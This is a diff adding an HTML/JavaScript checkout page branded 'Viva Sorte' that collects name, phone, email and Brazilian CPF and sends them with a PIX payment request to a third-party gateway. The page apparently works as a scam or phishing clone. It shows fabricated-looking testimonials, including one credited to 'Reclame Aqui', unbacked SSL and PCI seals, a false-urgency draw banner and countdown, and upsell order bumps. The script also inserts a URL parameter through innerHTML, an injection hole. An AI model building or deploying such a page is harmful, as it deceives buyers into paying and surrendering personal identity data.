@@ -1,0 +1,1429 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Checkout - Viva Sorte</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.4/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link href="css/style.css" rel="stylesheet" />
+    <link href="css/bootstrap-icons.min.css" rel="stylesheet" />
+    <link href="css2" rel="stylesheet" />
+    <style>
+      body {
+        background: linear-gradient(135deg, #2f4eb5 0%, #1a237e 100%);
+        min-height: 100vh;
+        padding-bottom: 40px;
+      }
+
+      .form-container {
+        padding: 0;
+        max-width: 600px;
+        margin: 20px auto;
+        background: white;
+        border-radius: 24px;
+        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+        overflow: hidden;
+      }
+
+      .checkout-banner {
+        background: linear-gradient(135deg, #2f4eb5 0%, #1a237e 100%);
+        padding: 30px;
+        color: white;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .checkout-banner::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url("images/pattern.png");
+        opacity: 0.1;
+      }
+
+      .checkout-banner h1 {
+        font-size: 24px;
+        font-weight: 700;
+        margin-bottom: 20px;
+        position: relative;
+      }
+
+      .checkout-amount {
+        background: rgba(255, 255, 255, 0.1);
+        padding: 20px;
+        border-radius: 16px;
+        display: inline-block;
+        margin: 0 auto;
+        position: relative;
+      }
+
+      .checkout-amount .label {
+        font-size: 16px;
+        opacity: 0.9;
+        margin-bottom: 5px;
+      }
+
+      .checkout-amount .value {
+        font-size: 36px;
+        font-weight: 700;
+        color: #f0ad4e;
+        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      }
+
+      .checkout-content {
+        padding: 30px;
+      }
+
+      .pix-card {
+        background: #f8f9fa;
+        border-radius: 16px;
+        padding: 25px;
+        text-align: center;
+        margin-bottom: 30px;
+        border: 2px solid #e9ecef;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .pix-card::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+        background: linear-gradient(90deg, #2f4eb5, #f0ad4e);
+      }
+
+      .pix-icon {
+        width: 70px;
+        height: 70px;
+        background: #2f4eb5;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+        box-shadow: 0 4px 15px rgba(47, 78, 181, 0.2);
+      }
+
+      .pix-icon i {
+        font-size: 35px;
+        color: white;
+      }
+
+      .form-group {
+        margin-bottom: 25px;
+        position: relative;
+      }
+
+      .form-group label {
+        font-weight: 600;
+        color: #1a237e;
+        margin-bottom: 10px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .form-group label i {
+        color: #2f4eb5;
+      }
+
+      .form-control {
+        padding: 15px 20px;
+        border: 2px solid #e9ecef;
+        border-radius: 12px;
+        transition: all 0.3s ease;
+        font-size: 16px;
+        background: #f8f9fa;
+      }
+
+      .form-control:focus {
+        border-color: #2f4eb5;
+        background: white;
+        box-shadow: 0 0 0 4px rgba(47, 78, 181, 0.1);
+      }
+
+      .trust-badges {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 15px;
+        margin: 30px 0;
+      }
+
+      .trust-badge {
+        background: white;
+        padding: 15px;
+        border-radius: 12px;
+        text-align: center;
+        border: 2px solid #e9ecef;
+        transition: all 0.3s ease;
+      }
+
+      .trust-badge:hover {
+        transform: translateY(-3px);
+        border-color: #2f4eb5;
+      }
+
+      .trust-badge i {
+        font-size: 28px;
+        color: #2f4eb5;
+        margin-bottom: 8px;
+      }
+
+      .trust-badge p {
+        margin: 0;
+        font-size: 13px;
+        color: #495057;
+        font-weight: 500;
+      }
+
+      .btn-finalizar {
+        background: linear-gradient(135deg, #f0ad4e 0%, #e09132 100%);
+        color: white;
+        width: 100%;
+        padding: 18px;
+        border: none;
+        border-radius: 12px;
+        font-weight: 700;
+        font-size: 18px;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        box-shadow: 0 4px 15px rgba(240, 173, 78, 0.3);
+      }
+
+      .btn-finalizar:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(240, 173, 78, 0.4);
+      }
+
+      .security-info {
+        margin-top: 25px;
+        padding: 20px;
+        background: #f8f9fa;
+        border-radius: 12px;
+        border: 2px solid #e9ecef;
+      }
+
+      .security-info-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 15px;
+      }
+
+      .security-info-header i {
+        font-size: 24px;
+        color: #2f4eb5;
+      }
+
+      .security-info-header h4 {
+        margin: 0;
+        font-size: 16px;
+        font-weight: 600;
+        color: #1a237e;
+      }
+
+      .security-seals {
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        margin-top: 20px;
+      }
+
+      .security-seal img {
+        height: 40px;
+        opacity: 0.8;
+        transition: opacity 0.3s ease;
+      }
+
+      .security-seal img:hover {
+        opacity: 1;
+      }
+
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+        }
+
+        50% {
+          transform: scale(1.02);
+        }
+
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      .highlight-animation {
+        animation: pulse 2s infinite;
+      }
+
+      .sorteio-date {
+        text-align: center;
+        margin: 20px 0;
+        color: white;
+      }
+
+      .sorteio-date h1 {
+        font-size: 1rem;
+        margin: 0;
+      }
+
+      .sorteio-date span {
+        display: inline-block;
+        padding: 5px 10px;
+        border-radius: 5px;
+        margin: 0 5px;
+      }
+
+      .social-proof {
+        max-width: 600px;
+        margin: 30px auto;
+        background: white;
+        border-radius: 24px;
+        padding: 20px;
+        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+      }
+
+      .testimonial {
+        display: flex;
+        align-items: flex-start;
+        gap: 15px;
+        padding: 20px;
+        border-bottom: 1px solid #e9ecef;
+      }
+
+      .testimonial:last-child {
+        border-bottom: none;
+      }
+
+      .testimonial-avatar {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        object-fit: cover;
+      }
+
+      .testimonial-content {
+        flex: 1;
+      }
+
+      .testimonial-name {
+        font-weight: 600;
+        color: #1a237e;
+        margin-bottom: 5px;
+      }
+
+      .testimonial-text {
+        color: #495057;
+        font-size: 14px;
+        margin-bottom: 8px;
+        line-height: 1.4;
+      }
+
+      .testimonial-stars {
+        color: #f0ad4e;
+        font-size: 14px;
+      }
+
+      .orderbump {
+        background: #fff5f5;
+        border: 2px dashed #dc3545;
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 20px;
+      }
+
+      .orderbump-title {
+        color: #dc3545;
+        font-weight: 600;
+        font-size: 18px;
+        text-align: center;
+        margin-bottom: 15px;
+      }
+
+      .orderbump-item {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        padding: 12px;
+        background: white;
+        border-radius: 8px;
+        margin-bottom: 10px;
+        border: 1px solid #ffe5e5;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .orderbump-item:hover {
+        border-color: #2f4eb5;
+        background: #f8f9fa;
+      }
+
+      .orderbump-item.selected {
+        border-color: #2f4eb5;
+        background: #f0f7ff;
+      }
+
+      .orderbump-checkbox {
+        width: 20px;
+        height: 20px;
+        accent-color: #2f4eb5;
+      }
+
+      .orderbump-content {
+        flex: 1;
+      }
+
+      .orderbump-text {
+        font-weight: 600;
+        color: #2f4eb5;
+        margin-bottom: 2px;
+        font-size: 14px;
+      }
+
+      .orderbump-price {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+      }
+
+      .orderbump-price-old {
+        color: #dc3545;
+        text-decoration: line-through;
+        font-size: 13px;
+      }
+
+      .orderbump-price-new {
+        color: #28a745;
+        font-weight: 600;
+        font-size: 13px;
+      }
+
+      .pix-modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+        backdrop-filter: blur(5px);
+      }
+
+      .pix-modal-content {
+        background: white;
+        border-radius: 24px;
+        padding: 30px;
+        width: 90%;
+        max-width: 500px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        animation: slideUp 0.3s ease-out;
+      }
+
+      @keyframes slideUp {
+        from {
+          transform: translateY(30px);
+          opacity: 0;
+        }
+        to {
+          transform: translateY(0);
+          opacity: 1;
+        }
+      }
+
+      .pix-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 25px;
+      }
+
+      .pix-logo {
+        height: 40px;
+      }
+
+      .pix-timer {
+        background: #f8f9fa;
+        padding: 10px 20px;
+        border-radius: 50px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-weight: 600;
+        color: #2f4eb5;
+      }
+
+      .pix-amount {
+        background: linear-gradient(135deg, #2f4eb5 0%, #1a237e 100%);
+        padding: 20px;
+        border-radius: 16px;
+        text-align: center;
+        margin-bottom: 25px;
+        color: white;
+      }
+
+      .pix-amount-label {
+        display: block;
+        font-size: 14px;
+        opacity: 0.9;
+        margin-bottom: 5px;
+      }
+
+      .pix-amount-value {
+        font-size: 32px;
+        font-weight: 700;
+      }
+
+      .pix-code-container {
+        background: #f8f9fa;
+        padding: 20px;
+        border-radius: 16px;
+        margin-bottom: 25px;
+      }
+
+      .pix-instruction {
+        font-size: 14px;
+        color: #495057;
+        margin-bottom: 15px;
+      }
+
+      .pix-code-box {
+        background: white;
+        border: 2px solid #e9ecef;
+        border-radius: 12px;
+        padding: 15px;
+        margin-bottom: 15px;
+        overflow: hidden;
+      }
+
+      .pix-code {
+        display: block;
+        font-family: monospace;
+        font-size: 14px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        color: #1a237e;
+        width: 100%;
+        text-align: center;
+      }
+
+      .copy-button {
+        background: #2f4eb5;
+        color: white;
+        border: none;
+        padding: 15px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        width: 100%;
+        font-size: 16px;
+        font-weight: 600;
+        margin-bottom: 10px;
+      }
+
+      .copy-button:hover {
+        background: #1a237e;
+        transform: translateY(-2px);
+      }
+
+      .copy-button:active {
+        transform: translateY(0);
+      }
+
+      .copy-button i {
+        font-size: 20px;
+      }
+
+      .copy-success {
+        display: none;
+        text-align: center;
+        color: #28a745;
+        margin-top: 10px;
+        font-size: 14px;
+      }
+
+      .pix-steps {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 15px;
+        margin-bottom: 25px;
+      }
+
+      .pix-step {
+        text-align: center;
+      }
+
+      .step-number {
+        width: 40px;
+        height: 40px;
+        background: #f0ad4e;
+        color: white;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 600;
+        margin: 0 auto 10px;
+      }
+
+      .step-text {
+        font-size: 13px;
+        color: #495057;
+      }
+
+      .pix-warning {
+        background: #fff5f5;
+        border: 1px solid #ffe5e5;
+        border-radius: 12px;
+        padding: 15px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        color: #dc3545;
+        font-size: 14px;
+      }
+
+      /* Loading modal styles */
+      .loading-content {
+        text-align: center;
+        padding: 40px 20px;
+      }
+
+      .loading-icon {
+        margin-bottom: 20px;
+      }
+
+      .loading-icon i {
+        font-size: 50px;
+        color: #2f4eb5;
+      }
+
+      .spin {
+        animation: spin 1.5s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <header class="white-header">
+      <div class="logo">
+        <img src="images/logoviva.png" alt="Logomarca" class="logoviva" />
+      </div>
+      <button class="menu-button" id="menuButton">
+        ☰
+        <!-- Ícone de três linhas -->
+      </button>
+    </header>
+
+    <div class="sorteio-date w-100 text-center">
+      <h1>
+        Sorteio já é
+        <span style="background-color: #f0ad4e" id="contador">HOJE</span>
+      </h1>
+    </div>
+
+    <div class="container-principal">
+      <div class="form-container">
+        <div class="checkout-banner">
+          <h1>Complete sua Participação</h1>
+          <div class="checkout-amount highlight-animation">
+            <div class="label">
+              Total a pagar:<br /><small>0 títulos selecionados</small>
+            </div>
+            <div class="value">R$ 0,00</div>
+          </div>
+        </div>
+
+        <div class="checkout-content">
+          <div class="pix-card">
+            <div class="pix-icon">
+              <i class="bi bi-qr-code"></i>
+            </div>
+            <h3>Pagamento via PIX</h3>
+            <p class="text-muted mb-0">
+              Aprovação instantânea e processamento seguro
+            </p>
+          </div>
+
+          <form id="checkoutForm">
+            <div class="form-group">
+              <label><i class="bi bi-person"></i> Nome Completo</label>
+              <input
+                type="text"
+                class="form-control"
+                id="nome"
+                placeholder="Digite seu nome completo"
+                required
+              />
+            </div>
+
+            <div class="form-group">
+              <label><i class="bi bi-phone"></i> Telefone</label>
+              <input
+                type="tel"
+                class="form-control"
+                id="telefone"
+                placeholder="(00) 00000-0000"
+                required
+              />
+            </div>
+
+            <div class="form-group">
+              <label><i class="bi bi-envelope"></i> E-mail</label>
+              <input
+                type="email"
+                class="form-control"
+                id="email"
+                placeholder="seu@email.com"
+                required
+              />
+            </div>
+
+            <div class="form-group">
+              <label><i class="bi bi-card-text"></i> CPF</label>
+              <input
+                type="text"
+                class="form-control"
+                id="cpf"
+                placeholder="000.000.000-00"
+                required
+              />
+              <div
+                id="cpfError"
+                style="
+                  color: #dc3545;
+                  font-size: 12px;
+                  margin-top: 5px;
+                  display: none;
+                "
+              >
+                CPF inválido. Por favor, verifique o número digitado.
+              </div>
+            </div>
+
+            <div class="trust-badges">
+              <div class="trust-badge">
+                <i class="bi bi-shield-check"></i>
+                <p>Compra 100% Segura</p>
+              </div>
+              <div class="trust-badge">
+                <i class="bi bi-lightning-charge"></i>
+                <p>Aprovação Instantânea</p>
+              </div>
+              <div class="trust-badge">
+                <i class="bi bi-lock"></i>
+                <p>Dados Protegidos</p>
+              </div>
+            </div>
+
+            <div class="orderbump">
+              <div class="orderbump-title">Você também pode adicionar:</div>
+
+              <label class="orderbump-item" onclick="selectOrdebump(this)">
+                <input
+                  type="radio"
+                  name="orderbump"
+                  class="orderbump-checkbox"
+                  value="15"
+                />
+                <img
+                  src="images/orderbump.png"
+                  style="width: 40px; height: 40px"
+                  alt="Bônus"
+                />
+                <div class="orderbump-content">
+                  <div class="orderbump-text">
+                    COMPRE + 15 TÍTULOS COM 30% DE DESCONTO
+                  </div>
+                  <div class="orderbump-price">
+                    <span class="orderbump-price-old">R$ 14,85</span>
+                    <span class="orderbump-price-new">por apenas R$ 10,40</span>
+                  </div>
+                </div>
+              </label>
+
+              <label class="orderbump-item" onclick="selectOrdebump(this)">
+                <input
+                  type="radio"
+                  name="orderbump"
+                  class="orderbump-checkbox"
+                  value="30"
+                />
+                <img
+                  src="images/orderbump.png"
+                  style="width: 40px; height: 40px"
+                  alt="Bônus"
+                />
+                <div class="orderbump-content">
+                  <div class="orderbump-text">
+                    COMPRE + 30 TÍTULOS COM 30% DE DESCONTO
+                  </div>
+                  <div class="orderbump-price">
+                    <span class="orderbump-price-old">R$ 19,70</span>
+                    <span class="orderbump-price-new">por apenas R$ 13,79</span>
+                  </div>
+                </div>
+              </label>
+
+              <label class="orderbump-item" onclick="selectOrdebump(this)">
+                <input
+                  type="radio"
+                  name="orderbump"
+                  class="orderbump-checkbox"
+                  value="60"
+                />
+                <img
+                  src="images/orderbump.png"
+                  style="width: 40px; height: 40px"
+                  alt="Bônus"
+                />
+                <div class="orderbump-content">
+                  <div class="orderbump-text">
+                    COMPRE + 60 TÍTULOS COM 50% DE DESCONTO
+                  </div>
+                  <div class="orderbump-price">
+                    <span class="orderbump-price-old">R$ 59,40</span>
+                    <span class="orderbump-price-new">por apenas R$ 29,70</span>
+                  </div>
+                </div>
+              </label>
+            </div>
+
+            <button type="submit" class="btn-finalizar">Gerar PIX Agora</button>
+
+            <div class="security-info">
+              <div class="security-info-header">
+                <i class="bi bi-shield-lock"></i>
+                <h4>Ambiente Seguro</h4>
+              </div>
+              <p class="text-muted mb-0">
+                Seus dados estão protegidos por certificação SSL e criptografia
+                de ponta a ponta.
+              </p>
+
+              <div class="security-seals">
+                <div class="security-seal">
+                  <img src="images/ssl.png" alt="SSL Secure" />
+                </div>
+                <div class="security-seal">
+                  <img src="images/pci.webp" alt="PCI Compliant" />
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <div class="social-proof">
+        <div class="testimonial">
+          <img
+            src="images/avatar1.jpg"
+            alt="Cinthia"
+            class="testimonial-avatar"
+          />
+          <div class="testimonial-content">
+            <div class="testimonial-name">Cinthia</div>
+            <div class="testimonial-text">
+              Obrigada Renato ganhei o kiwid na semana passada, pode comprar e
+              acreditar que sua vez vai chegar!! estou muito feliz!!
+            </div>
+            <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
+          </div>
+        </div>
+
+        <div class="testimonial">
+          <img
+            src="images/avatar2.jpeg"
+            alt="Lucas Santos"
+            class="testimonial-avatar"
+          />
+          <div class="testimonial-content">
+            <div class="testimonial-name">Lucas Santos</div>
+            <div class="testimonial-text">
+              Ganhei pela primeira vez sou de Pernambuco, meu sonho da casa
+              própria foi realiza graças ao viva sorte e o abençoado do Renato
+              gratidão.
+            </div>
+            <div class="testimonial-stars">⭐⭐⭐⭐½</div>
+          </div>
+        </div>
+
+        <div class="testimonial">
+          <img
+            src="images/avatar3.jpeg"
+            alt="Jussara Cristina"
+            class="testimonial-avatar"
+          />
+          <div class="testimonial-content">
+            <div class="testimonial-name">Jussara Cristina</div>
+            <div class="testimonial-text">
+              Viva sorte mudou minha vida acreditei e ganhei o prêmio de 100 mil
+              obrigada Renato e a todos os envolvidos do viva sorte, acreditei e
+              ganhei obrigadaa meu Deus
+            </div>
+            <div class="testimonial-stars">⭐⭐⭐⭐½</div>
+          </div>
+        </div>
+
+        <div class="testimonial">
+          <img
+            src="images/avatar4.jpg"
+            alt="Reclame Aqui"
+            class="testimonial-avatar"
+          />
+          <div class="testimonial-content">
+            <div class="testimonial-name">Reclame Aqui</div>
+            <div class="testimonial-text">
+              A viva sorte possui mais de +700.000 avaliações positivas, uma
+              empresa RA1000, com máxima segurança e transparência. 99,6%
+              voltariam a fazer negócio.
+            </div>
+            <div class="testimonial-stars">⭐⭐⭐⭐½</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Add the loading modal just before the existing pixModal -->
+    <div id="loadingModal" class="pix-modal" style="display: none">
+      <div class="pix-modal-content loading-content">
+        <div class="loading-icon">
+          <i class="bi bi-arrow-repeat spin"></i>
+        </div>
+        <h3>Gerando PIX...</h3>
+        <p>Por favor, aguarde enquanto processamos seu pagamento.</p>
+      </div>
+    </div>
+
+    <div id="pixModal" class="pix-modal" style="display: none">
+      <div class="pix-modal-content">
+        <div class="pix-header">
+          <img src="images/pix.webp" alt="PIX" class="pix-logo" />
+          <div class="pix-timer">
+            <i class="bi bi-clock"></i>
+            <span id="pixTimer">10:00</span>
+          </div>
+        </div>
+
+        <div class="pix-amount">
+          <span class="pix-amount-label">Valor total</span>
+          <span class="pix-amount-value" id="pixAmount">R$ 0,00</span>
+        </div>
+
+        <div class="pix-code-container">
+          <p class="pix-instruction">Copie o código PIX abaixo:</p>
+          <div class="pix-code-box">
+            <code id="pixCode" class="pix-code"></code>
+          </div>
+          <button id="copyButton" class="copy-button">
+            <i class="bi bi-clipboard"></i>
+            Copiar código PIX
+          </button>
+          <div id="copySuccess" class="copy-success">
+            <i class="bi bi-check-circle"></i>
+            Código copiado!
+          </div>
+        </div>
+
+        <div class="pix-steps">
+          <div class="pix-step">
+            <div class="step-number">1</div>
+            <div class="step-text">Abra o app do seu banco</div>
+          </div>
+          <div class="pix-step">
+            <div class="step-number">2</div>
+            <div class="step-text">Escolha pagar com PIX</div>
+          </div>
+          <div class="pix-step">
+            <div class="step-number">3</div>
+            <div class="step-text">Cole o código e confirme</div>
+          </div>
+        </div>
+
+        <div class="pix-warning">
+          <i class="bi bi-exclamation-triangle"></i>
+          <span>O código PIX expira em 10 minutos</span>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Contador regressivo
+
+      // Máscaras para os campos
+      document
+        .getElementById("telefone")
+        .addEventListener("input", function (e) {
+          let value = e.target.value.replace(/\D/g, "");
+          if (value.length > 11) value = value.slice(0, 11);
+          if (value.length > 2)
+            value = `(${value.slice(0, 2)}) ${value.slice(2)}`;
+          if (value.length > 9)
+            value = `${value.slice(0, 10)}-${value.slice(10)}`;
+          e.target.value = value;
+        });
+
+      document.getElementById("cpf").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length > 11) value = value.slice(0, 11);
+        if (value.length > 3) value = `${value.slice(0, 3)}.${value.slice(3)}`;
+        if (value.length > 7) value = `${value.slice(0, 7)}.${value.slice(7)}`;
+        if (value.length > 11)
+          value = `${value.slice(0, 11)}-${value.slice(11)}`;
+        e.target.value = value;
+      });
+
+      // Função para validar CPF
+      function validateCPF(cpfNumber) {
+        cpfNumber = cpfNumber.replace(/\D/g, "");
+
+        if (cpfNumber.length !== 11) return false;
+
+        // Verifica se todos os dígitos são iguais
+        if (/^(\d)\1+$/.test(cpfNumber)) return false;
+
+        // Validação do primeiro dígito verificador
+        let sum = 0;
+        for (let i = 0; i < 9; i++) {
+          sum += parseInt(cpfNumber.charAt(i)) * (10 - i);
+        }
+        let digit = 11 - (sum % 11);
+        if (digit >= 10) digit = 0;
+        if (digit !== parseInt(cpfNumber.charAt(9))) return false;
+
+        // Validação do segundo dígito verificador
+        sum = 0;
+        for (let i = 0; i < 10; i++) {
+          sum += parseInt(cpfNumber.charAt(i)) * (11 - i);
+        }
+        digit = 11 - (sum % 11);
+        if (digit >= 10) digit = 0;
+        if (digit !== parseInt(cpfNumber.charAt(10))) return false;
+
+        return true;
+      }
+
+      function selectOrdebump(element) {
+        // Remove a classe selected de todos os items
+        document.querySelectorAll(".orderbump-item").forEach((item) => {
+          item.classList.remove("selected");
+        });
+
+        // Adiciona a classe selected ao item clicado
+        element.classList.add("selected");
+
+        // Marca o radio button
+        const radio = element.querySelector('input[type="radio"]');
+        radio.checked = true;
+      }
+
+      // Função para pegar parâmetros da URL
+      function getUrlParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return {
+          quantidade: urlParams.get("quantidade") || "0",
+          valor: urlParams.get("valor") || "0",
+          utm_source: urlParams.get("utm_source") || "",
+          utm_medium: urlParams.get("utm_medium") || "",
+          utm_campaign: urlParams.get("utm_campaign") || "",
+        };
+      }
+
+      // Função para atualizar os valores na página
+      function updateCheckoutValues() {
+        const params = getUrlParams();
+        const checkoutAmount = document.querySelector(".checkout-amount");
+
+        // Atualiza o valor total
+        const valueElement = checkoutAmount.querySelector(".value");
+        valueElement.textContent = `R$ ${params.valor}`;
+
+        // Adiciona a quantidade de títulos
+        const labelElement = checkoutAmount.querySelector(".label");
+        labelElement.innerHTML = `Total a pagar: <br><small>${params.quantidade} títulos selecionados</small>`;
+      }
+
+      // Função para calcular valor total com orderbump
+      function calculateTotalWithOrdebump() {
+        const params = getUrlParams();
+        let totalValue = parseFloat(params.valor);
+
+        const selectedOrdebump = document.querySelector(
+          ".orderbump-item.selected"
+        );
+        if (selectedOrdebump) {
+          const priceText = selectedOrdebump.querySelector(
+            ".orderbump-price-new"
+          ).textContent;
+          const ordebumpValue = parseFloat(
+            priceText.replace(/[^0-9,]/g, "").replace(",", ".")
+          );
+          totalValue += ordebumpValue;
+        }
+
+        return totalValue.toFixed(2);
+      }
+
+      // Atualiza o formulário quando a página carregar
+      document.addEventListener("DOMContentLoaded", updateCheckoutValues);
+
+      // Função para formatar o telefone para o formato da API
+      function formatPhoneForApi(phone) {
+        return phone.replace(/\D/g, "");
+      }
+
+      // Função para formatar o CPF para o formato da API
+      function formatCpfForApi(cpf) {
+        return cpf.replace(/\D/g, "");
+      }
+
+      // Função para formatar o timer
+      function formatTime(seconds) {
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        return `${minutes}:${remainingSeconds.toString().padStart(2, "0")}`;
+      }
+
+      // Função para iniciar o timer
+      function startPixTimer() {
+        let timeLeft = 600; // 10 minutos em segundos
+        const timerElement = document.getElementById("pixTimer");
+
+        const timer = setInterval(() => {
+          timeLeft--;
+          timerElement.textContent = formatTime(timeLeft);
+
+          if (timeLeft <= 0) {
+            clearInterval(timer);
+            window.location.reload(); // Recarrega a página quando o tempo acabar
+          }
+        }, 1000);
+      }
+
+      // Função para mostrar o modal do PIX
+      function showPixModal(pixCode, amount) {
+        const modal = document.getElementById("pixModal");
+        const codeElement = document.getElementById("pixCode");
+        const amountElement = document.getElementById("pixAmount");
+
+        codeElement.textContent = pixCode;
+        amountElement.textContent = `R$ ${amount.toFixed(2)}`;
+        modal.style.display = "flex";
+
+        startPixTimer();
+      }
+
+      // Função para copiar o código PIX
+      document
+        .getElementById("copyButton")
+        .addEventListener("click", async () => {
+          const pixCode = document.getElementById("pixCode").textContent;
+          await navigator.clipboard.writeText(pixCode);
+
+          const successMessage = document.getElementById("copySuccess");
+          successMessage.style.display = "block";
+
+          setTimeout(() => {
+            successMessage.style.display = "none";
+          }, 3000);
+        });
+        
+        
+        top
+        
+
+      // Função para verificar o status do pagamento
+      function checkPaymentStatus(transactionId) {
+        let checkCount = 0;
+        const maxChecks = 120; // 10 minutos (120 * 5 segundos)
+
+        const statusCheck = setInterval(async () => {
+          try {
+            const response = await fetch(
+              `https://app.duttyonpay.com.br/api-pix/UfWPh6gMr1W-u32Qduvtz80_r9JjfF_gV7rNXT3e_XbIAEdkLnuiO6GYbu-9xQ8WUe0zSLA79S2IFLutIWwHAA?transactionId=${transactionId}`,
+              {
+                method: "GET",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+              }
+            );
+
+            const data = await response.json();
+
+            if (data.status === "COMPLETED") {
+              clearInterval(statusCheck);
+              // Redirecionar para a URL desejada
+              window.location.href = "./up1/";
+            }
+
+            checkCount++;
+            if (checkCount >= maxChecks) {
+              clearInterval(statusCheck);
+              alert(
+                "Tempo de verificação expirado. Por favor, tente novamente."
+              );
+              window.location.reload();
+            }
+          } catch (error) {
+            console.error("Erro ao verificar status:", error);
+          }
+        }, 5000);
+      }
+
+      // Função para mostrar o modal de carregamento
+      function showLoadingModal() {
+        const modal = document.getElementById("loadingModal");
+        modal.style.display = "flex";
+      }
+
+      // Função para esconder o modal de carregamento
+      function hideLoadingModal() {
+        const modal = document.getElementById("loadingModal");
+        modal.style.display = "none";
+      }
+
+      // Atualizar o evento de submit do formulário para incluir a verificação
+      document
+        .getElementById("checkoutForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          // Validar CPF antes de prosseguir
+          const cpfValue = document
+            .getElementById("cpf")
+            .value.replace(/\D/g, "");
+          if (!validateCPF(cpfValue)) {
+            document.getElementById("cpfError").style.display = "block";
+            document.getElementById("cpf").focus(); // Foca no campo CPF
+            window.scrollTo({
+              // Rola a página até o campo CPF
+              top: document.getElementById("cpf").offsetTop - 100,
+              behavior: "smooth",
+            });
+            return;
+          }
+          // Esconde a mensagem de erro se o CPF for válido
+          document.getElementById("cpfError").style.display = "none";
+
+          const totalValue = calculateTotalWithOrdebump();
+          const params = getUrlParams();
+          const selectedOrdebump = document.querySelector(
+            ".orderbump-item.selected"
+          );
+          const ordebumpValue = selectedOrdebump
+            ? selectedOrdebump.querySelector('input[type="radio"]').value
+            : "0";
+
+          // Pega os valores dos campos do formulário
+          const name = document.getElementById("nome").value;
+          const phone = formatPhoneForApi(
+            document.getElementById("telefone").value
+          );
+          const email = document.getElementById("email").value;
+          const cpf = formatCpfForApi(document.getElementById("cpf").value);
+
+          // Monta o objeto para a API
+          const apiData = {
+            amount: parseFloat(totalValue) * 100, // Convertendo para centavos
+            description: "Viva Sorte - Títulos",
+            customer: {
+              name: name,
+              document: cpf,
+              phone: phone,
+              email: email,
+            },
+            item: {
+              title: `${params.quantidade} Títulos${
+                ordebumpValue !== "0" ? ` + ${ordebumpValue} Bônus` : ""
+              }`,
+              price: parseFloat(totalValue) * 100, // Convertendo para centavos
+              quantity: 1,
+            },
+            utm: `utm_source=${params.utm_source}${
+              params.utm_medium ? `&utm_medium=${params.utm_medium}` : ""
+            }${
+              params.utm_campaign ? `&utm_campaign=${params.utm_campaign}` : ""
+            }`,
+            paymentMethod: "PIX",
+          };
+
+          try {
+            // Mostra o modal de carregamento ao invés de apenas mudar o texto do botão
+            showLoadingModal();
+
+            // Desabilita o botão durante a requisição
+            const submitButton = document.querySelector(".btn-finalizar");
+            submitButton.disabled = true;
+
+            // Faz a requisição para a API
+            const response = await fetch(
+              "https://app.duttyonpay.com.br/api-pix/UfWPh6gMr1W-u32Qduvtz80_r9JjfF_gV7rNXT3e_XbIAEdkLnuiO6GYbu-9xQ8WUe0zSLA79S2IFLutIWwHAA",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify(apiData),
+              }
+            );
+
+            const data = await response.json();
+
+            if (response.ok) {
+              console.log("Sucesso:", data);
+              // Esconde o modal de carregamento antes de mostrar o modal do PIX
+              hideLoadingModal();
+              showPixModal(data.pixCode, parseFloat(totalValue));
+              checkPaymentStatus(data.transactionId);
+
+              // Desabilita o formulário
+              const form = document.getElementById("checkoutForm");
+              const inputs = form.getElementsByTagName("input");
+              for (let input of inputs) {
